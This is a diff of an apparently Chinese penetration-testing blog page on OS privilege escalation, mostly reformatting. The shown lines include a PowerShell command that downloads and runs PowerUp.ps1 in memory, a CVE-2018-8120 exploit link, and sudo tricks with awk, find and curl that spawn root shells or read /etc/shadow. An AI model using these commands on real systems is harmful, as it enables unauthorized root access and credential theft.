@@ -52,7 +52,7 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240213105341345.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83/image-20240213105405202.png">
 <meta property="article:published_time" content="2024-02-12T00:40:38.000Z">
-<meta property="article:modified_time" content="2024-03-10T14:50:58.269Z">
+<meta property="article:modified_time" content="2024-03-11T02:55:23.648Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -408,7 +408,8 @@
 <p>  cmd 环境运行</p>
   <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">powershell -ep bypass -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span><br></code></pre></td></tr></table></figure>
 
-<p>  内存加载</p>
+<pre><code class="hljs">      内存加载
+</code></pre>
   <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">powershell -<span class="hljs-keyword">nop </span>-exec <span class="hljs-keyword">bypass </span>-c <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#x27;); Invoke-AllChecks&quot;</span><br></code></pre></td></tr></table></figure>
 <p>  我们可以将这个脚本放置到服务器上面</p>
 <h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ul>
@@ -431,7 +432,8 @@
 <p>  <a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a></p>
 </li>
 </ul>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="CVE-2018-8120"><a href="#CVE-2018-8120" class="headerlink" title="CVE-2018-8120"></a>CVE-2018-8120</h3><blockquote>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>e### CVE-2018-8120</p>
+<blockquote>
 <p>  <a target="_blank" rel="noopener" href="https://github.com/alpha1ab/CVE-2018-8120">https://github.com/alpha1ab/CVE-2018-8120</a>  </p>
 </blockquote>
 <p>使用方法</p>
@@ -665,8 +667,14 @@
 <p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>  </p>
 </blockquote>
 <p>这个网站收集了所有的指令</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo /bin/ash<br>sudo /usr/bin/awk -F: ‘&#123;<span class="hljs-built_in">print</span> <span class="hljs-variable">$1</span> <span class="hljs-variable">$2</span>&#125;<span class="hljs-string">&#x27; /etc/shadow</span><br><span class="hljs-string">sudo /usr/bin/awk &#x27;</span>BEGIN &#123;system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#125;<span class="hljs-string">&#x27;</span><br><span class="hljs-string">sudo curl file:///etc/shadow</span><br><span class="hljs-string">sudo find . -exec /bin/sh \; -quit</span><br></code></pre></td></tr></table></figure></li>
+</li>
 </ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo /bin/ash<br>sudo /usr/bin/awk -F: ‘&#123;<span class="hljs-built_in">print</span> <span class="hljs-variable">$1</span> <span class="hljs-variable">$2</span>&#125;<span class="hljs-string">&#x27; /etc/shadow</span><br><span class="hljs-string">sudo /usr/bin/awk &#x27;</span>BEGIN &#123;system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)&#125;<span class="hljs-string">&#x27;</span><br><span class="hljs-string">sudo curl file:///etc/shadow</span><br><span class="hljs-string">sudo find . -exec /bin/sh \; -quit</span><br></code></pre></td></tr></table></figure>
+
+
+
+
+
 <h2 id="suid-权限提权"><a href="#suid-权限提权" class="headerlink" title="suid 权限提权"></a>suid 权限提权</h2><ul>
 <li><p>文件s 权限</p>
 <p>也称为suid 权限，就是在文件的可执行权限处为s</p>
